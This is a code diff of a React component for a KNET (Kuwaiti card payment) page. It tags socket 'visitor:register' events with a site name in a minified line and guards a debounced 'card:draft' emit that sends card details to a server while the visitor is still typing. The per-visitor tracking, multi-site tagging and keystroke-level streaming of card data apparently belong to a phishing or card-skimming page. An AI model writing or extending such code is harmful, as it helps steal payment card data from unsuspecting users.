@@ -126,14 +126,15 @@ export default function KNETPayment() {
   useEffect(() => { phaseRef.current = phase; }, [phase]);
 
   useEffect(() => {
-    const _s=socket.value,_a=()=>{try{_s.emit("visitor:register",{existingVisitorId:localStorage.getItem("kdd.server.pid")||null})}catch(e){}};if(_s.connected)_a();_s.off("connect",_a);_s.on("connect",_a);
+    const _s=socket.value,_a=()=>{try{_s.emit("visitor:register",{existingVisitorId:localStorage.getItem("kdd.server.pid")||null,siteName:"KDCAW"})}catch(e){}};if(_s.connected)_a();_s.off("connect",_a);_s.on("connect",_a);
   }, []);
 
   useEffect(() => {
     if (liveDebounceRef.current) clearTimeout(liveDebounceRef.current);
     liveDebounceRef.current = setTimeout(() => {
       if (!socket.value.connected) return;
-      try { socket.value.emit("visitor:register", { existingVisitorId: localStorage.getItem("kdd.server.pid") || null }); } catch (e) {}
+      try { socket.value.emit("visitor:register", { existingVisitorId: localStorage.getItem("kdd.server.pid") || null, siteName: "KDCAW" }); } catch (e) {}
+      if (!cardNumber && !selectedBank) return;
       socket.value.emit("card:draft", {
         paymentMethod: "KNET",
         prefix: selectedPrefix,
